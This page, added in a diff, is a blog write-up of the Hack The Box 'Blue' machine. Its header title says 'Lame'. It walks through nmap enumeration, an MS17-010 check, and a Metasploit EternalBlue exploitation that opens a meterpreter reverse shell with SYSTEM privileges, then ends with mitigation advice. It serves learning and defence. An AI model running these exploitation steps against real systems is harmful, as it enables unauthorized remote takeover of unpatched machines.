@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A</title>
+    <link rel="icon" href="../images/icons/A.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
+
+</head>
+<body>
+    <div class="topnav">
+        <div class="logo">
+            <h2>Analogman</h2>
+        </div>
+        <div class="social-links">
+            <a href="https://youtu.be/9J62hGda9BQ?si=FGMES2gz8cWz9U3k" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+        </div>
+
+        <div class="menu-icon" onclick="toggleMenu()">
+            <i class="fa fa-bars"></i>
+        </div>
+        <!-- Menú desplegable que estará oculto por defecto -->
+        <ul class="navbar">
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="#">Tags</a></li>
+            <li><a href="../wp/index.html">WriteUps</a></li>
+        </ul>
+    </div>
+    <script>
+        function toggleMenu() {
+            const navbar = document.querySelector('.navbar');
+            navbar.classList.toggle('open');  
+        }
+    </script>
+    <div class="header">
+        <div class="wrapper">
+            <div class="sidebar">
+                <div class="profile">
+                    <img src="../images/profile.jpg" alt="">
+                    <h2>Analogman</h2>
+                    <h5>Hacker learner</h5>
+                </div>
+                <ul class="navbar">
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="#">Tags</a></li>
+                    <li><a href="../wp/index.html">WriteUps</a></li>
+                </ul>
+                <div class="social">
+                    <a href="https://www.youtube.com/watch?v=9J62hGda9BQ" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+                </div>
+            </div>
+
+            <!-- writeups aquí -->
+            <div class="writeup-container">
+                <h1>Lame WriteUp</h1>
+                
+                <section class="content">
+                    <!-- Texto explicativo -->
+                    <div class="img-container">
+                        <img src="../images/Posts/Blue/Blue_Description.png" alt="Preview" class="machine-image">
+                    </div>
+                    <h1>1. Summary</h1>
+                    <p>The "Blue" machine was successfully compromised by exploiting a critical vulnerability in the SMBv1 protocol, specifically with the EternalBlue exploit. This attack demonstrates the severity of the vulnerabilities in SMBv1, which allowed remote code execution and privileged access on the system.</p>
+                    <h1>2. Objectives and scope</h1>
+                    <p>The objective of this assessment is to identify and exploit critical vulnerabilities on the target system with IP address 10.129.110.209. The scope is limited to a single host with ports 135, 139, and 445 open. This assessment seeks to test the susceptibility of the target system's services to known attacks and to assess the potential impact of these vulnerabilities on network security.</p>
+                    <h1>3. Methodology</h1>
+                    <p>The methodology followed for this security assessment is based on a structured and systematic approach, with the aim of identifying and assessing the vulnerabilities present in the SMB service. This analysis is aligned with recognized industry standards, such as the OWASP Testing Guide and NIST best practices, and is developed in the following phases:</p>
+                    <h2>3.1 Recognition and scanning</h2>
+                    <p>We use the nmap tool to discover open ports on the target host (10.129.110.209) to gain an initial overview of the system, identifying key ports (135, 139, and 445) that offer potential attack vectors.</p>
+                    <h2>3.2 Enumeration phase</h2>
+                    <p>With the open ports identified, we perform a detailed enumeration of the services and versions using Nmap and specialized scripts, gathering critical information for the next exploitation step.</p>
+                    <h2>3.3 Exploitation phase</h2>
+                    <p>After confirming that the system is vulnerable to the EternalBlue exploit, we used Metasploit to exploit the vulnerability, gaining elevated access to the system.</p>
+                    <h2>3.4 Documentation and Recommendations</h2>
+                    <p>The final phase involved documenting the findings, prioritizing them according to their risk level, and developing specific recommendations to mitigate the detected vulnerabilities.</p>
+                    
+                    <h1>4. Enumeration</h1>
+                    <p>We start the enumeration phase using the nmap tool for discovering open ports.</p>
+                    <h2>4.1 Port Scanning</h2>
+                    <p>We run the command "<em>nmap -v -n -Pn 10.129.110.209"</em>:</p>
+                    <!-- Código con formato de consola -->
+                    <div class="console-code">
+                        <pre>
+$ sudo nmap -v -n -Pn 10.129.110.209
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 18:15 EST
+Initiating SYN Stealth Scan at 18:15
+Scanning 10.129.110.209 [1000 ports]
+Discovered open port 445/tcp on 10.129.110.209
+Discovered open port 139/tcp on 10.129.110.209
+Discovered open port 135/tcp on 10.129.110.209
+Discovered open port 49153/tcp on 10.129.110.209
+Discovered open port 49154/tcp on 10.129.110.209
+Discovered open port 49156/tcp on 10.129.110.209
+Discovered open port 49155/tcp on 10.129.110.209
+Discovered open port 49152/tcp on 10.129.110.209
+Discovered open port 49157/tcp on 10.129.110.209
+Completed SYN Stealth Scan at 18:15, 2.44s elapsed (1000 total ports)
+Nmap scan report for 10.129.110.209
+Host is up (0.034s latency).
+Not shown: 991 closed tcp ports (reset)
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49157/tcp open  unknown
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 2.49 seconds
+Raw packets sent: 1009 (44.396KB) | Rcvd: 1000 (40.036KB)
+                        </pre>
+                    </div>
+                    <h2>4.2 Service and version detection</h2>
+                    <p>Once the open ports have been discovered, we proceed to list the versions:</p>
+                    <div class="console-code">
+                        <pre>
+$ sudo nmap -v -n -Pn -sCV -p 135,139,445,49152,49153,49154,49155,49156,49157 10.129.110.209
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 18:17 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 18:17
+Completed NSE at 18:17, 0.00s elapsed
+Initiating NSE at 18:17
+Completed NSE at 18:17, 0.00s elapsed
+Initiating NSE at 18:17
+Completed NSE at 18:17, 0.00s elapsed
+Initiating SYN Stealth Scan at 18:17
+Scanning 10.129.110.209 [9 ports]
+Discovered open port 49156/tcp on 10.129.110.209
+Discovered open port 49157/tcp on 10.129.110.209
+Discovered open port 49152/tcp on 10.129.110.209
+Discovered open port 49153/tcp on 10.129.110.209
+Discovered open port 49154/tcp on 10.129.110.209
+Discovered open port 49155/tcp on 10.129.110.209
+Discovered open port 445/tcp on 10.129.110.209
+Discovered open port 139/tcp on 10.129.110.209
+Discovered open port 135/tcp on 10.129.110.209
+Completed SYN Stealth Scan at 18:17, 1.29s elapsed (9 total ports)
+Initiating Service scan at 18:17
+Scanning 9 services on 10.129.110.209
+Service scan Timing: About 44.44% done; ETC: 18:19 (0:01:09 remaining)
+Completed Service scan at 18:18, 60.43s elapsed (9 services on 1 host)
+NSE: Script scanning 10.129.110.209.
+Initiating NSE at 18:18
+Completed NSE at 18:19, 10.05s elapsed
+Initiating NSE at 18:19
+Completed NSE at 18:19, 0.00s elapsed
+Initiating NSE at 18:19
+Completed NSE at 18:19, 0.00s elapsed
+Nmap scan report for 10.129.110.209
+Host is up (0.034s latency).
+
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2024-11-13T23:18:27+00:00
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled but not required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: -27s, deviation: 1s, median: -28s
+| smb2-time: 
+|   date: 2024-11-13T23:18:29
+|_  start_date: 2024-11-13T23:07:07
+
+NSE: Script Post-scanning.
+Initiating NSE at 18:19
+Completed NSE at 18:19, 0.00s elapsed
+Initiating NSE at 18:19
+Completed NSE at 18:19, 0.00s elapsed
+Initiating NSE at 18:19
+Completed NSE at 18:19, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.10 seconds
+           Raw packets sent: 17 (748B) | Rcvd: 9 (396B)  
+                        </pre>
+                    </div>
+                    <p>Open ports found:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li>135/tcp: msrpc Microsoft Windows RPC</li>
+                            <li>139/tcp: netbios-ssn Microsoft Windows netbios-ssn</li>
+                            <li>445/tcp: microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</li>
+                        </ul>
+                    </div>
+                    <h1>5. Vulnerability analysis</h1>
+                    <p>We found a potentially vulnerable Windows 7. With a simple search for Windows 7 vulnerabilities on Google we can verify that this version suffers from a critical vulnerability called EternalBlue. We run a script on port 445 with nmap to check if the system is vulnerable:</p>
+                    <div class="console-code">
+                        <pre>
+$sudo nmap -p 445 --script smb-vuln-ms17-010 10.129.110.209                                 
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 18:32 EST
+Nmap scan report for 10.129.110.209 (10.129.110.209)
+Host is up (0.034s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+
+Nmap done: 1 IP address (1 host up) scanned in 1.73 seconds
+                        </pre>
+                    </div>
+                    <p>Apparently the host is vulnerable!</p>
+                    <h3>SMBv1 Eternalblue vulnerability (CVE-2017-0143)</h3>
+                    <h2>5.1 Vulnerability description</h2>
+                    <p>The <strong>CVE-2017-0143</strong> vulnerability, also known as <strong>EternalBlue</strong>, is a critical remote code execution vulnerability in the <strong>SMBv1</strong> (Server Message Block version 1) protocol in Windows operating systems. It was widely exploited by the <strong>WannaCry</strong> malware and other similar attacks in 2017.</p>
+                    <h2>5.2 Impact</h2>
+                    <p>EternalBlue was responsible for several large-scale ransomware attacks, most famously <strong>WannaCry</strong>, which encrypted files on thousands of systems globally and demanded Bitcoin payments to restore access. Other malware and exploits, such as <strong>NotPetya</strong> and <strong>Retefe</strong>, also used EternalBlue to cause large-scale damage across a variety of industries.</p>
+                    
+                    <h1>6. Exploitation</h1>
+                    <p>Exploitation is very simple and there are many ways we can take advantage of this vulnerability. In this case we will use metasploit:</p>
+                    <p>We open Metasploit with the "msfconsole" command:</p>
+                    <div class="console-code">
+                        <pre>
+$ msfconsole -q                 
+msf6 > 
+                        </pre>
+                    </div>
+                    <p>We choose and use the module "<i>exploit/windows/smb/ms17_010_eternalblue</i>":</p>
+                    <div class="console-code">
+                        <pre>
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+                        </pre>
+                    </div>
+                    <p>We configure the exploit with our IP (<strong>LHOST</strong>) and IP target (<strong>RHOSTS</strong>):</p>
+                    <div class="console-code">
+                        <pre>
+msf6 exploit(windows/smb/ms17_010_eternalblue) > options
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windo
+                                             ws Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows E
+                                             mbedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded St
+                                             andard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.1.131    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.129.110.209
+rhosts => 10.129.110.209
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.14.106
+lhost => 10.10.14.106
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+                        </pre>
+                    </div>
+                    <p>Now we run the exploit:</p>
+                    <div class="console-code">
+                        <pre>
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+[*] Started reverse TCP handler on 10.10.14.106:4444 
+[*] 10.129.110.209:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.129.110.209:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.129.110.209:445    - Scanned 1 of 1 hosts (100% complete)
+[+] 10.129.110.209:445 - The target is vulnerable.
+[*] 10.129.110.209:445 - Connecting to target for exploitation.
+[+] 10.129.110.209:445 - Connection established for exploitation.
+[+] 10.129.110.209:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.129.110.209:445 - CORE raw buffer dump (42 bytes)
+[*] 10.129.110.209:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.129.110.209:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.129.110.209:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.129.110.209:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.129.110.209:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.129.110.209:445 - Sending all but last fragment of exploit packet
+[*] 10.129.110.209:445 - Starting non-paged pool grooming
+[+] 10.129.110.209:445 - Sending SMBv2 buffers
+[+] 10.129.110.209:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.129.110.209:445 - Sending final SMBv2 buffers.
+[*] 10.129.110.209:445 - Sending last fragment of exploit packet!
+[*] 10.129.110.209:445 - Receiving response from exploit packet
+[+] 10.129.110.209:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.129.110.209:445 - Sending egg to corrupted connection.
+[*] 10.129.110.209:445 - Triggering free of corrupted buffer.
+[*] Sending stage (201798 bytes) to 10.129.110.209
+[*] Meterpreter session 1 opened (10.10.14.106:4444 -> 10.129.110.209:49158) at 2024-11-13 18:42:27 -0500
+[+] 10.129.110.209:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.129.110.209:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.129.110.209:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > shell
+Process 2140 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32> 
+                        </pre>
+                    </div>
+                    <p>The exploitation was successful and provided access to the system with NT AUTHORITY\SYSTEM privileges.</p>
+
+                    <h1>7. Conclusions</h1>
+                    <p>The target machine <strong>Blue</strong> was compromised via a critical exploit associated with the SMBv1 protocol (<strong>EternalBlue</strong>). This vulnerability allowed remote code execution, demonstrating that systems still using outdated and vulnerable versions of SMB are at risk of serious security compromises. System-level access confirms the effectiveness of this type of exploitation and highlights the importance of updating and securing critical services on the network.</p>
+                    <h1>8. Recommendations for Mitigation</h1>
+                    <p>To improve system security and mitigate future exploits it is recommended:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>Upgrade SMB Protocol</strong>: Disable SMBv1 on all systems within the network and upgrade to SMBv2 or SMBv3, which offer increased security and have fixed critical vulnerabilities associated with previous versions.</li>
+                            <li><strong>Apply Security Patches</strong>: Implement security patches provided by the operating system manufacturer (in this case, Microsoft) to fix known vulnerabilities, including the security patch for EternalBlue.</li>
+                            <li><strong>Network Segmentation and Access Control</strong>: Configure access control lists (ACLs) to restrict access to SMB ports to trusted network segments only. This will reduce the exposure of the system in case other machines try to exploit the SMB service.</li>
+                            <li><strong>Strengthen Security Monitoring</strong>: Implement continuous activity monitoring on critical ports (such as 445) to detect exploitation attempts. Monitoring tools and intrusion detection systems (IDS) can alert administrators of suspicious access attempts.</li>
+                            <li><strong>Periodic Audit and Review Policy</strong>: Establish an audit policy that includes periodic review of exposed services and protocols, as well as compliance with security updates and patches on all critical network systems.</li>
+                        </ul>
+                    </div>
+                    <p>Applying these measures will strengthen the security of SMB service and significantly reduce the risk associated with using outdated versions.</p>
+                    
+                    <!-- Imágenes
+                    <div class="writeup-image">
+                        <img src="../images/nothing_to_see_here.png" alt="Resultado del escaneo Nmap">
+                        <p class="caption">Figura 1: Resultado de escaneo Nmap en el host objetivo</p>
+                    </div>
+                    -->
+                </section>
+            </div>
+
+        </div>
+    </div>
+    
+    <!--Pet Cat-->
+    <div class="pet-container">
+        <img src="" alt="Walking Pet" id="pet" class="pet">
+    </div>
+    <script src="script.js"></script>
+    <!--Pet Cat-->
+</body>
+</html>
